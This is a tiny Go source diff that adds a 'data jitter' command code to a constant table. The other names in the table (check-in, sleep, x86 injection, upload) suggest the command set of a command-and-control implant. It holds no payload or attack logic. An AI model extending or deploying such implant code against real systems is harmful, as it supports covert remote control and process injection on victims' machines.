@@ -15,6 +15,7 @@ const (
 	CMD_TYPE_EXIT                      = 3
 	CMD_TYPE_SLEEP                     = 4
 	CMD_TYPE_CD                        = 5
+	CMD_TYPE_DATA_JITTER               = 6
 	CMD_TYPE_CHECKIN                   = 8
 	CMD_TYPE_INJECT_X86                = 9
 	CMD_TYPE_UPLOAD_START              = 10
